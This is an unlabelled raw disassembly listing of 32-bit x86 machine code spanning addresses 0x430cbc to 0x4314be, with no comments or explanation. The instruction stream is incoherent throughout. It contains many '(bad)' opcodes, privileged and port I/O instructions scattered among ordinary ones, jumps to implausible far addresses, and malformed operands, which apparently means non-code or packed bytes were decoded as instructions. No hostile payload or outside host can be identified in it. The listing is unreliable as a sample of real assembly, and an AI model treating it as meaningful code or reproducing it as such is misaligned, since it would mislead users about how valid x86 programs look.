  430cbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430cc2:	cld    
  430cc3:	(bad)  
  430cc4:	(bad)  
  430cc5:	scas   eax,DWORD PTR es:[edi]
  430cc6:	loopne 0x430d03
  430cc8:	mov    DWORD PTR [edi],ecx
  430cca:	mov    ebp,ebp
  430ccc:	clc    
  430ccd:	push   eax
  430ccf:	push   DWORD PTR [ebp-0x4]
  430cd2:	mov    BYTE PTR [ebp+0xa],0xff
  430cd6:	(bad)  
  430cd7:	int3   
  430cd8:	or     BYTE PTR [eax],al
  430cda:	(bad)  
  430cdb:	lea    eax,[edi]
  430cdd:	ins    BYTE PTR es:[edi],dx
  430cde:	(bad)  
  430cdf:	inc    DWORD PTR [ecx]
  430ce1:	push   eax
  430ce2:	mov    BYTE PTR [ebp+0x9],0x8b
  430ce6:	leave  
  430ce7:	les    edx,FWORD PTR [ebp+0x0]
  430cea:	in     al,dx
  430ceb:	call   DWORD PTR [ecx-0x75]
  430cee:	inc    ebp
  430cef:	cld    
  430cf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cf6:	cld    
  430cf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430cfd:	pop    es
  430cfe:	mov    eax,DWORD PTR [eax]
  430d00:	clc    
  430d01:	test   eax,esi
  430d03:	je     0x430d7a
  430d05:	mov    eax,esi
  430d07:	cld    
  430d08:	add    al,0x80
  430d0a:	add    WORD PTR [ecx+0x0],ax
  430d0e:	fiadd  DWORD PTR [eax]
  430d10:	mov    BYTE PTR [eax],0x3d
  430d13:	push   0xffffffc3
  430d15:	push   edi
  430d16:	mov    edx,DWORD PTR [eax+0x51]
  430d19:	pop    edi
  430d1a:	lea    ebx,[ebx-0x8]
  430d1d:	ret    0x45
  430d20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d26:	xchg   eax,edi
  430d28:	mov    DWORD PTR [ebp-0x75],ecx
  430d2b:	push   esi
  430d2c:	clc    
  430d2d:	jne    0x430cff
  430d2f:	mov    ecx,0xf8450b0b
  430d34:	(bad)  
  430d35:	push   cs
  430d36:	or     BYTE PTR [ebp-0x3a],dh
  430d39:	cmp    eax,DWORD PTR [ecx]
  430d3b:	pop    esi
  430d3c:	(bad)  
  430d3d:	or     al,0x5
  430d3f:	inc    eax
  430d40:	leave  
  430d41:	jmp    0x40cf:0x25564204
  430d48:	leave  
  430d49:	in     eax,dx
  430d4a:	inc    DWORD PTR [eax-0x75]
  430d4d:	fimul  DWORD PTR [ebx-0x228139be]
  430d53:	inc    eax
  430d54:	nop
  430d55:	loopne 0x430d56
  430d57:	ret    
  430d58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d5e:	add    eax,0xff45e8f8
  430d63:	push   esi
  430d64:	push   DWORD PTR [ebp-0x39]
  430d67:	mov    eax,0x7edda46
  430d6c:	or     al,0x6
  430d6e:	push   DWORD PTR [ebp-0x3a]
  430d71:	cmp    eax,DWORD PTR [edx]
  430d73:	pop    esi
  430d74:	ret    
  430d75:	or     al,0x56
  430d77:	inc    ecx
  430d78:	push   ebp
  430d79:	jle    0x430d67
  430d7b:	inc    edx
  430d7c:	inc    ebp
  430d7d:	int    0x1
  430d7f:	inc    ecx
  430d80:	sub    BYTE PTR ds:0xe77541fc,ah
  430d86:	add    DWORD PTR [edx+0x1c],eax
  430d89:	retf   0xc38b
  430d8c:	adc    al,0x8b
  430d8e:	xchg   edx,eax
  430d8f:	push   ecx
  430d90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d96:	rcl    DWORD PTR [esi-0x9],cl
  430d99:	jne    0x430deb
  430d9b:	mov    eax,0x7c80ece
  430da0:	rol    DWORD PTR [esi],cl
  430da2:	div    DWORD PTR [ebp+0x50]
  430da5:	cmp    ecx,edx
  430da7:	pop    esi
  430da8:	dec    BYTE PTR [edx]
  430daa:	in     al,dx
  430dab:	inc    edx
  430dac:	sub    esp,ecx
  430dae:	inc    eax
  430daf:	(bad)  
  430db0:	push   eax
  430db1:	add    edx,DWORD PTR [eax-0x1f]
  430db4:	push   edi
  430db5:	add    dh,dh
  430db7:	leave  
  430db8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430dbc:	add    BYTE PTR [ecx+0x0],dl
  430dbf:	inc    ebp
  430dc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430dc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430dcc:	add    al,0x2
  430dce:	jmp    0x57eb928
  430dd3:	jne    0x430dbd
  430dd5:	mov    eax,DWORD PTR [edx]
  430dd7:	or     BYTE PTR [eax],al
  430dd9:	inc    ecx
  430dda:	stc    
  430ddb:	in     eax,dx
  430ddc:	ss inc eax
  430dde:	aas    
  430ddf:	out    0x7d,eax
  430de1:	inc    ecx
  430de2:	mov    ebp,ecx
  430de4:	lock ret 0x7d
  430de8:	and    ecx,DWORD PTR [ebx-0x171777]
  430dee:	add    bh,bh
  430df0:	aad    0xd7
  430df2:	add    dh,cl
  430df4:	clts   
  430df6:	(bad)  
  430df7:	call   0xffce0cfc
  430dfc:	hlt    
  430dfd:	iret   
  430dfe:	jge    0x430dd6
  430e00:	rol    DWORD PTR [esi-0x80],cl
  430e03:	jmp    0x1c5d10
  430e08:	out    dx,al
  430e09:	mov    eax,DWORD PTR [ebx]
  430e0b:	(bad)  
  430e0c:	pop    esi
  430e0d:	push   es
  430e0e:	cmp    al,0xe8
  430e10:	sar    edi,0x8
  430e13:	inc    DWORD PTR [edi]
  430e15:	inc    esi
  430e16:	(bad)  
  430e17:	loopne 0x430e97
  430e19:	push   edi
  430e1a:	push   cs
  430e1b:	push   ebx
  430e1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430e22:	add    BYTE PTR [ebp+0x50],al
  430e25:	push   eax
  430e26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e2c:	sub    edx,DWORD PTR [esi-0x24]
  430e2f:	jne    0x430de7
  430e31:	lods   eax,DWORD PTR ds:[esi]
  430e32:	mov    edx,DWORD PTR [edx-0x34]
  430e35:	dec    esi
  430e36:	out    0x83,eax
  430e38:	into   
  430e39:	push   edi
  430e3b:	loopne 0x430e0b
  430e3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e48:	rol    DWORD PTR [edx],0x8
  430e4b:	mov    esp,ecx
  430e4d:	cmp    DWORD PTR [ebx],0xc
  430e50:	mov    esi,0x5001c0
  430e55:	push   eax
  430e56:	push   cs
  430e57:	push   eax
  430e58:	(bad)  
  430e59:	sub    edx,edi
  430e5b:	push   esi
  430e5c:	adc    al,0xcb
  430e5e:	ins    DWORD PTR es:[edi],dx
  430e5f:	mov    eax,0x203e8
  430e64:	add    al,ah
  430e66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e6d:	add    dh,al
  430e6f:	add    ah,ch
  430e71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e77:	pop    ecx
  430e78:	or     eax,ebx
  430e7a:	cli    
  430e7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e81:	lea    ebp,[ebx]
  430e83:	mov    edx,DWORD PTR [edx-0x4]
  430e86:	dec    ecx
  430e87:	inc    ebp
  430e88:	shr    BYTE PTR [ebx],0x4b
  430e8b:	and    al,0x0
  430e8d:	(bad)  
  430e8e:	jne    0x430ed5
  430e90:	pop    eax
  430e91:	mov    al,0x5a
  430e93:	call   0x14210f2
  430e98:	and    al,0x85
  430e9a:	push   edx
  430e9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e9f:	dec    ebp
  430ea0:	mov    cl,0x23
  430ea2:	jmp    0x430e90
  430ea4:	mov    al,0xe7
  430ea6:	call   0x1391194
  430eab:	shr    DWORD PTR [eax+ebx*2],cl
  430eae:	lock (bad) 
  430eb0:	adc    eax,0x757f008d
  430eb5:	out    0x58,eax
  430eb7:	cmp    al,0x7
  430eb9:	pop    edx
  430eba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ec1:	push   ecx
  430ec2:	cld    
  430ec3:	mov    esi,0x3b0175
  430ec8:	and    al,0xb0
  430eca:	xor    BYTE PTR [edx+0x1],0x8b
  430ece:	add    ah,bh
  430ed0:	mov    edi,DWORD PTR [ebp-0x4]
  430ed3:	psubsw mm7,QWORD PTR [edi]
  430ed6:	add    DWORD PTR [ebp+0x0],ebp
  430ed9:	rcr    eax,1
  430edb:	mov    edi,ecx
  430edd:	and    eax,DWORD PTR [eax]
  430edf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ee5:	call   0x13011ce
  430eea:	add    al,cl
  430eec:	mov    ebp,esi
  430eee:	aam    0x83
  430ef0:	or     DWORD PTR [ecx],eax
  430ef2:	jne    0x430ee5
  430ef4:	mov    eax,DWORD PTR [eax]
  430ef6:	aam    0x0
  430ef8:	dec    ebp
  430ef9:	jne    0x430e86
  430efb:	cmp    ebx,eax
  430efd:	jb     0x430f4c
  430eff:	jmp    0x430e8c
  430f01:	mov    ebx,esp
  430f03:	int3   
  430f04:	dec    ebp
  430f05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f0c:	mov    edx,0x8b0a8b
  430f11:	cmp    ecx,DWORD PTR [eax]
  430f13:	jb     0x430eec
  430f15:	pop    edx
  430f16:	push   edi
  430f17:	cli    
  430f18:	pop    es
  430f19:	mov    eax,ecx
  430f1b:	jb     0x430f1f
  430f1d:	add    DWORD PTR [ebx],0xa
  430f20:	mov    eax,DWORD PTR [ebx]
  430f22:	int3   
  430f23:	add    bh,BYTE PTR [esi+0x75d10006]
  430f29:	jmp    0x430eb6
  430f2b:	mov    al,0xe8
  430f2d:	call   0x10411af
  430f32:	add    edx,DWORD PTR [ecx+ecx*8]
  430f35:	pop    edi
  430f36:	or     BYTE PTR [ecx-0x73],bl
  430f39:	pop    ecx
  430f3a:	inc    edi
  430f3b:	xor    al,0xeb
  430f3d:	push   ecx
  430f3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f44:	call   0xb21049
  430f49:	int3   
  430f4a:	sbb    BYTE PTR [esi],ch
  430f4c:	inc    ebp
  430f4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f53:	call   0x9c11c2
  430f58:	or     BYTE PTR [ebx-0x73],dl
  430f5b:	cmp    al,0x47
  430f5d:	mov    al,0x1
  430f5f:	jb     0x430f61
  430f61:	mov    al,0x10
  430f63:	push   eax
  430f64:	add    al,0x75
  430f66:	add    BYTE PTR [ebx],ch
  430f68:	add    ebx,esp
  430f6a:	int3   
  430f6b:	jne    0x430f7d
  430f6d:	movsx  edx,cl
  430f70:	add    DWORD PTR [eax],eax
  430f72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f79:	mov    gs,edi
  430f7b:	add    BYTE PTR [eax-0x50],ch
  430f7e:	add    al,ch
  430f80:	mov    eax,DWORD PTR [ecx]
  430f82:	sub    eax,DWORD PTR [eax]
  430f84:	jb     0x430ffb
  430f86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f8a:	jge    0x430f74
  430f8c:	add    al,0x1
  430f8e:	add    DWORD PTR [eax],0x0
  430f91:	jne    0x430f93
  430f93:	je     0x430fda
  430f95:	mov    eax,DWORD PTR [edi]
  430f97:	ror    BYTE PTR [ebp+0x4d],1
  430f9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430fa1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430fa7:	mov    DWORD PTR [ebx],ebp
  430fa9:	fadd   DWORD PTR [eax+0x75]
  430fac:	inc    eax
  430fad:	pop    eax
  430fae:	lea    ebx,[ecx+0x4f]
  430fb1:	push   0xb1000003
  430fb6:	out    dx,eax
  430fb7:	add    ebp,DWORD PTR [edx+edx*2]
  430fba:	add    BYTE PTR [ebx+ecx*4],bh
  430fbd:	mov    ch,BYTE PTR [ebx]
  430fbf:	jb     0x431033
  430fc1:	add    al,0x89
  430fc3:	push   eax
  430fc4:	call   0x842b5d36
  430fc9:	add    DWORD PTR [eax+eax*1],eax
  430fcc:	jae    0x430fe2
  430fce:	icebp  
  430fcf:	inc    ebp
  430fd0:	mov    eax,DWORD PTR gs:[ecx]
  430fd3:	int3   
  430fd4:	out    dx,al
  430fd5:	loopne 0x431024
  430fd7:	sub    eax,DWORD PTR [edx]
  430fd9:	push   0xffffff83
  430fdb:	pop    esi
  430fdc:	push   cs
  430fdd:	jl     0x430ff8
  430fdf:	add    al,0xaf
  430fe1:	xor    eax,0x832b6d00
  430fe6:	mov    eax,DWORD PTR [edx]
  430fe8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ff4:	inc    ebp
  430ff5:	shr    ebx,0x3
  430ff8:	or     DWORD PTR [eax],0x4
  430ffb:	push   0xffffffa5
  430ffd:	pop    esi
  430ffe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431005:	jmp    0x431064
  431007:	mov    edi,0xff0272
  43100c:	fdivr  QWORD PTR [ebp+0x5d]
  43100f:	push   0x4e
  431011:	pop    ecx
  431012:	call   0x435417
  431017:	mov    DWORD PTR [ebx],eax
  431019:	in     al,0xc8
  43101b:	rol    BYTE PTR [ebp-0x75],0xc1
  43101f:	call   0xad1200
  431024:	pop    esi
  431025:	enter  0xceff,0x8b
  431029:	repz mov ecx,DWORD PTR [ebp-0x34]
  43102d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431034:	je     0x431036
  431036:	or     DWORD PTR [ebx-0x74183b24],eax
  43103c:	jne    0x431022
  43103e:	jmp    0x431039
  431040:	push   DWORD PTR [edx-0x24]
  431043:	push   0x4d
  431045:	pop    ecx
  431046:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  43104a:	jge    0x431052
  43104c:	mov    eax,eax
  43104e:	sub    ebp,DWORD PTR [edx+0x24]
  431051:	pop    esi
  431052:	inc    ebp
  431053:	mov    esp,0x8b6077
  431058:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43105e:	lods   al,BYTE PTR ds:[esi]
  43105f:	add    BYTE PTR [ebx],bh
  431061:	enter  0xce73,0x49
  431065:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  43106d:	stc    
  43106e:	jge    0x4310e2
  431070:	jnp    0xdd4293df
  431076:	call   0xc6114c
  43107b:	fadd   st(0),st
  43107d:	dec    esi
  43107e:	ins    BYTE PTR es:[edi],dx
  43107f:	stc    
  431080:	cmp    al,0x73
  431082:	push   ebp
  431083:	mov    eax,0xf8028b
  431088:	jne    0x43104b
  43108a:	mov    esi,ecx
  43108c:	mov    esp,DWORD PTR [ebp+0x2c]
  43108f:	add    edi,DWORD PTR [ebp-0x24]
  431092:	sub    esp,eax
  431094:	and    al,0x45
  431096:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43109c:	sbb    al,0xee
  43109e:	pop    esi
  43109f:	call   0x8310cf
  4310a4:	fsubr  st,st(3)
  4310a6:	sti    
  4310a7:	add    BYTE PTR gs:[ecx],bh
  4310aa:	add    eax,esp
  4310ac:	add    DWORD PTR [esi],eax
  4310ae:	rol    DWORD PTR [ebp+0x8],0x29
  4310b2:	mov    esp,eax
  4310b4:	clc    
  4310b5:	jne    0x43112c
  4310b7:	mov    eax,0x8b0673
  4310bc:	loopne 0x431103
  4310be:	loopne 0x431049
  4310c0:	lods   al,BYTE PTR ds:[esi]
  4310c1:	int3   
  4310c2:	inc    ebp
  4310c3:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310c7:	add    al,0xc3
  4310c9:	sub    ecx,DWORD PTR [ebp+0x47]
  4310cc:	(bad)  
  4310ce:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310d2:	add    eax,DWORD PTR [eax]
  4310d4:	call   0x644d1d9
  4310d9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310df:	dec    esi
  4310e0:	ins    DWORD PTR es:[edi],dx
  4310e1:	in     al,dx
  4310e2:	lea    eax,[eax]
  4310e4:	inc    ebp
  4310e5:	inc    ebp
  4310e6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310ec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310f6:	and    al,0xdc
  4310f8:	ror    DWORD PTR [edx+0x24],0xf7
  4310fc:	or     BYTE PTR [ebp+0x4c],dh
  4310ff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431103:	stos   BYTE PTR es:[edi],al
  431104:	adc    edx,edi
  431106:	inc    esp
  431107:	add    edi,DWORD PTR [eax]
  431109:	jne    0x4310ee
  43110b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431111:	cmp    ecx,DWORD PTR [edi]
  431113:	sub    BYTE PTR [ebp-0x7e],dl
  431116:	sar    ebp,0xb
  431119:	jmp    FWORD PTR [edi+0x2400392a]
  43111f:	sub    esi,DWORD PTR [ebx-0x73]
  431122:	mov    esp,DWORD PTR [ecx+edi*4]
  431125:	mov    ecx,DWORD PTR [eax]
  431127:	and    BYTE PTR [eax],al
  431129:	jne    0x4310f5
  43112b:	sub    ebp,ecx
  43112d:	sbb    BYTE PTR [esi+0x32],ah
  431130:	dec    ebp
  431131:	push   ebp
  431132:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431138:	ret    
  431139:	mov    edx,ebp
  43113b:	leave  
  43113c:	sub    DWORD PTR [esi+0x24],ebx
  43113f:	ret    0x2b
  431142:	pop    ax
  431144:	push   ebp
  431145:	rol    BYTE PTR [ebx],0xeb
  431148:	add    DWORD PTR [ecx+0x6c0001],0x40
  43114f:	jb     0x4311a6
  431151:	ret    
  431152:	in     al,dx
  431153:	jecxz  0x4310e0
  431155:	push   esi
  431156:	xchg   esp,eax
  431157:	jne    0x431159
  431159:	cmp    edx,DWORD PTR [esi+0x1c]
  43115c:	jne    0x431142
  43115e:	mov    eax,DWORD PTR [ebp-0x77]
  431161:	ror    DWORD PTR [ebx+0x899408],0xe0
  431168:	mov    esi,DWORD PTR [ebp-0x75]
  43116b:	pop    esi
  43116c:	nop
  43116d:	mov    eax,DWORD PTR [eax]
  43116f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431175:	add    al,0x0
  431177:	inc    ebp
  431178:	mov    eax,DWORD PTR [ebx]
  43117a:	mov    ebp,ebx
  43117c:	cmp    al,0xf
  43117e:	or     al,al
  431180:	inc    ebp
  431181:	inc    ebp
  431182:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431188:	cld    
  431189:	add    BYTE PTR [edi+0x546c16c0],dh
  43118f:	add    BYTE PTR [ecx-0x5],dl
  431192:	add    eax,0x17200
  431197:	sbb    al,0x85
  431199:	dec    esp
  43119a:	je     0x4311d4
  43119c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4311a0:	add    BYTE PTR [ebx],bh
  4311a2:	(bad)  
  4311a3:	and    al,0x32
  4311a5:	jae    0x431143
  4311a7:	mov    cl,cl
  4311a9:	inc    DWORD PTR [esp]
  4311ac:	push   ebp
  4311ad:	shr    esp,0x8
  4311b0:	in     al,dx
  4311b1:	push   esp
  4311b2:	add    DWORD PTR [eax],esp
  4311b4:	add    bl,cl
  4311b6:	inc    ebp
  4311b7:	mov    bh,0x89
  4311b9:	add    ah,bh
  4311bb:	jmp    0xca752105
  4311c0:	pushf  
  4311c1:	dec    esp
  4311c2:	mov    edx,0xf8178520
  4311c7:	fst    DWORD PTR [ebp+0x0]
  4311ca:	mov    BYTE PTR [eax],0xc4
  4311cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4311d0:	inc    ebp
  4311d1:	add    eax,0xc601da
  4311d6:	mov    al,0xc6
  4311d9:	ins    BYTE PTR es:[edi],dx
  4311da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311e1:	dec    esp
  4311e2:	jmp    DWORD PTR [eax]
  4311e4:	inc    ebp
  4311e5:	fnstcw WORD PTR [esi+0x29]
  4311e8:	test   BYTE PTR [eax],0xc8
  4311eb:	rol    BYTE PTR [eax],0xc0
  4311ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4311f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311fa:	inc    esi
  4311fb:	add    DWORD PTR [eax],ebx
  4311fd:	add    dh,bh
  4311ff:	mov    esi,DWORD PTR [edx+0x8]
  431202:	(bad)  
  431203:	fdiv   QWORD PTR ss:[ecx]
  431206:	(bad)  
  431207:	mov    bl,ch
  431209:	add    esi,eax
  43120b:	add    dh,bl
  43120d:	or     esi,eax
  43120f:	mov    dl,0xdf
  431211:	add    esi,eax
  431213:	add    al,ah
  431215:	push   cs
  431216:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43121d:	or     BYTE PTR [ebx],dh
  43121f:	dec    ecx
  431220:	lea    eax,[ebx]
  431222:	xor    eax,0x18fc0fc7
  431227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431228:	repz clc 
  43122a:	add    eax,DWORD PTR [ebp+0x46]
  43122d:	prefetcht0 BYTE PTR [ecx-0x2]
  431231:	xor    eax,0x7c60872
  431236:	mov    esp,0xbd32c69b
  43123b:	pop    esi
  43123c:	mov    cl,0xbe
  43123f:	or     al,0xc6
  431241:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431248:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43124f:	add    dh,al
  431251:	mov    eax,ebx
  431253:	xor    DWORD PTR [ebx],0x35008dbc
  431259:	mov    ecx,DWORD PTR [edi]
  43125b:	sbb    al,0x18
  43125d:	inc    ebp
  43125e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431265:	clc    
  431266:	(bad)  
  431267:	xor    DWORD PTR [edx-0x64],esi
  43126a:	lea    ecx,[ecx+0x45ffe838]
  431270:	mov    ecx,ebx
  431272:	fadd   st,st(6)
  431274:	dec    ebp
  431275:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43127b:	out    0x1,eax
  43127d:	inc    ebp
  43127e:	lea    ebp,ds:0xc8ffc6ff
  431284:	enter  0xa33,0xc6
  431288:	push   ebp
  431289:	leave  
  43128a:	(bad)  
  43128b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431291:	add    BYTE PTR [ebp+0x44],al
  431294:	mov    eax,esp
  431296:	mov    WORD PTR [esi+0x46398300],?
  43129c:	psubusw mm4,QWORD PTR [esi-0x78]
  4312a0:	add    BYTE PTR [ebx-0x1303f975],al
  4312a6:	add    BYTE PTR [ebp+0x1],0xeb
  4312aa:	add    BYTE PTR [ebp+0x38],al
  4312ad:	in     eax,dx
  4312ae:	inc    ebp
  4312af:	inc    ebp
  4312b0:	mov    ebx,ebx
  4312b2:	add    BYTE PTR [ebp+0x0],0xec
  4312b6:	mov    DWORD PTR [ebp-0x41],eax
  4312b9:	sub    eax,0x2c00454e
  4312be:	ins    DWORD PTR es:[edi],dx
  4312bf:	inc    ebp
  4312c0:	add    BYTE PTR [esi+0x66],bh
  4312c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312d4:	dec    edi
  4312d5:	pop    es
  4312d6:	add    ah,ch
  4312d8:	mov    DWORD PTR [ebp+0x68],eax
  4312db:	in     eax,dx
  4312dc:	inc    DWORD PTR [ebp-0x7d]
  4312df:	out    0xc0,al
  4312e1:	inc    ebp
  4312e2:	mov    edx,esp
  4312e4:	push   0x45
  4312e6:	(bad)  
  4312e7:	jmp    0xdf9258a4
  4312ec:	add    BYTE PTR [ebp-0x77],al
  4312ef:	out    dx,al
  4312f0:	ins    BYTE PTR es:[edi],dx
  4312f1:	inc    ebp
  4312f2:	jmp    edi
  4312f4:	add    DWORD PTR [ebp-0x14],0x7e
  4312f8:	mov    esi,esi
  4312fa:	outs   dx,BYTE PTR ds:[esi]
  4312fb:	inc    esp
  4312fc:	(bad)  
  4312fd:	mov    esp,0x8341b68d
  431302:	mov    DWORD PTR [esi+0x70],eax
  431305:	fcos   
  431307:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43130d:	in     al,dx
  43130e:	jb     0x431295
  431310:	(bad)  
  431311:	dec    DWORD PTR [ebx-0x7aba9901]
  431317:	mov    edi,edi
  431319:	fdivr  st,st(7)
  43131b:	out    dx,eax
  43131c:	rcl    BYTE PTR [ebx],0x66
  43131f:	mov    DWORD PTR [ebp-0xc70075],eax
  431325:	(bad)  
  431326:	std    
  431327:	cmp    eax,DWORD PTR [eax]
  431329:	jne    0x431391
  43132b:	mov    DWORD PTR [ebp-0xba0048],eax
  431331:	in     al,dx
  431332:	outs   dx,BYTE PTR ds:[esi]
  431333:	pushf  
  431334:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43133a:	inc    DWORD PTR [ecx]
  43133c:	inc    DWORD PTR [eax]
  43133e:	jae    0x431378
  431340:	add    BYTE PTR [ebp+0x850266],al
  431346:	inc    DWORD PTR [ebp-0x1]
  431349:	mov    eax,eax
  43134b:	jl     0x4313b3
  43134d:	add    BYTE PTR [ebp-0x740077],al
  431353:	cld    
  431354:	dec    eax
  431355:	add    BYTE PTR [eax],0x1
  431358:	data16 add BYTE PTR [ebp+0x38],al
  43135c:	mov    eax,0x47c2
  431361:	mov    eax,0x824f89
  431366:	inc    edi
  431367:	mov    DWORD PTR [edx+0x64],ebp
  43136a:	inc    WORD PTR [ebp-0x75]
  43136e:	(bad)  
  43136f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431376:	inc    ebp
  431377:	jge    0x431358
  431379:	add    bh,ah
  43137b:	lea    ax,[ebp-0x750030]
  431382:	add    al,0x46
  431385:	jmp    0x40ff:0x8885
  43138b:	push   DWORD PTR [ebp+0x52]
  43138e:	lea    eax,[eax]
  431390:	shl    BYTE PTR [esi-0x7b],1
  431393:	test   esi,edi
  431395:	(bad)  
  431396:	(bad)  
  431397:	inc    DWORD PTR [ebp-0x990140]
  43139d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4313a3:	inc    edi
  4313a4:	push   ecx
  4313a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4313ac:	add    al,al
  4313ae:	ret    
  4313af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313b6:	push   eax
  4313b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313be:	add    BYTE PTR [ebx-0x764f8839],al
  4313c4:	push   DWORD PTR [esi+0x1]
  4313c7:	inc    DWORD PTR [eax]
  4313c9:	mov    eax,0xff99ff
  4313ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313d4:	jne    0x43138e
  4313d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313e0:	mov    ecx,0xd74fb8
  4313e5:	add    cl,al
  4313e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313f4:	(bad)  
  4313f5:	push   ebp
  4313f7:	mov    eax,0x8c2789
  4313fc:	ret    0x6689
  4313ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431403:	add    bh,ah
  431405:	mov    WORD PTR [ebp-0x70],ax
  431409:	(bad)  
  43140a:	ret    0x667d
  43140d:	or     BYTE PTR [ebp-0x77],dl
  431410:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431417:	loop   0x4313a2
  431419:	(bad)  
  43141a:	xchg   esi,eax
  43141b:	aam    0xcf
  43141d:	out    dx,al
  43141e:	mov    DWORD PTR [esi-0x68],edi
  431421:	inc    ebp
  431422:	dec    edx
  431423:	pop    ecx
  431424:	mov    edx,DWORD PTR [eax]
  431426:	repnz push bp
  431429:	or     BYTE PTR [ebx+0x55106638],0x49
  431430:	(bad)  
  431431:	repnz xor eax,0xa0898945
  431437:	mov    ah,0x89
  431439:	jmp    DWORD PTR [edx+0x66b0418d]
  43143f:	inc    DWORD PTR [ebp+0x50]
  431442:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431446:	mov    DWORD PTR [eax],ecx
  431448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431449:	pop    es
  43144a:	inc    ecx
  43144b:	(bad)  
  43144c:	data16 fwait
  43144e:	inc    ebp
  43144f:	xor    ah,BYTE PTR [esi+0x3]
  431452:	dec    ebp
  431453:	push   eax
  431454:	inc    bp
  431456:	jge    0x4313db
  431458:	mov    esp,DWORD PTR [esi-0x18]
  43145b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431461:	add    DWORD PTR [ebx],esi
  431463:	add    BYTE PTR [ebx],al
  431465:	test   DWORD PTR [ebx],esi
  431467:	(bad)  
  431468:	inc    WORD PTR [ebp+0x0]
  43146c:	mov    eax,DWORD PTR [eax]
  43146e:	call   0x8898cba3
  431473:	mov    esi,eax
  431475:	clc    
  431476:	ret    
  431477:	rol    cl,0xa
  43147a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431480:	mov    edx,edi
  431482:	pushf  
  431483:	pop    es
  431484:	jmp    FWORD PTR [edx+0x66]
  431487:	add    BYTE PTR [ebp-0x990175],al
  43148d:	inc    ebp
  43148e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431494:	push   ebp
  431495:	mov    edi,eax
  431497:	mov    dh,BYTE PTR [eax+0x266ff51]
  43149d:	push   ebp
  43149e:	add    BYTE PTR [ebx-0x764b0777],al
  4314a4:	dec    DWORD PTR [esi+0x661851e8]
  4314aa:	add    BYTE PTR [ebp-0x7b],dl
  4314ad:	cmp    esi,0xfffffffb
  4314b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4314b6:	jmp    DWORD PTR [esi-0x75]
  4314b9:	push   ebp
  4314ba:	hlt    
  4314bb:	data16 (bad) 
  4314bd:	dec    ebp
  4314be:	ret    
